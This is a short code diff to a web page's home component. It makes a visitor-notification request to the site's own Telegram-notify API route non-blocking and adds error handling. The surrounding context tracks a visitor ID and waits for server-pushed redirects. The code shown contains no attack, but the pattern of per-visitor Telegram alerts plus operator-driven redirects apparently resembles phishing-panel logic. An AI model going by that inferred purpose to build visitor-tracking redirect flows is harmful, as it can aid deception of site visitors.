@@ -12,18 +12,23 @@ export default function Home() {
         localStorage.setItem('visitorId', visitorId);
         console.log('[index.js] Sending visitor notification, visitorId:', visitorId);
         
-        const response = await fetch('/api/telegram/notify-visitor', {
+        // Send notification (non-blocking - don't fail if it doesn't work)
+        fetch('/api/telegram/notify-visitor', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ visitorId })
+        })
+        .then(async (response) => {
+          const data = await response.json();
+          console.log('[index.js] Notification response:', data);
+          if (!data.success) {
+            console.warn('[index.js] Telegram notification warning:', data.warning || data.message);
+          }
+        })
+        .catch(error => {
+          console.warn('[index.js] Notification error (non-blocking):', error);
+          // Don't block page load if notification fails
         });
-        
-        const data = await response.json();
-        console.log('[index.js] Notification response:', data);
-        
-        if (!response.ok) {
-          console.error('[index.js] Failed to send notification:', data);
-        }
         
         // Use SSE for instant redirect notifications + polling as backup
         let redirectReceived = false;
